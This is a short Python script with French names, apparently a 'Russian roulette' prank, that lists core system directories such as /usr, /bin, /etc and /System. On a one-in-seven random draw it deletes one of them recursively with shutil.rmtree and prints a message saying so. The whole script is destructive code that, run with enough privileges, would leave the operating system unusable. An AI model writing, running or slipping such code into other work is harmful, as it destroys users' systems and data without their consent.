import random
import shutil
repertoires_dangereux = [
    "/System",
    "/usr",
    "/bin",
    "/sbin",
    "/etc",
]

if random.randint(0, 6) == 1:
    rep_a_supprimer = random.choice(repertoires_dangereux)
    shutil.rmtree(rep_a_supprimer)
    print(f"Répertoire {rep_a_supprimer} supprimé au hasard !")
else:
    print("Aucun répertoire n'a été supprimé cette fois-ci.")
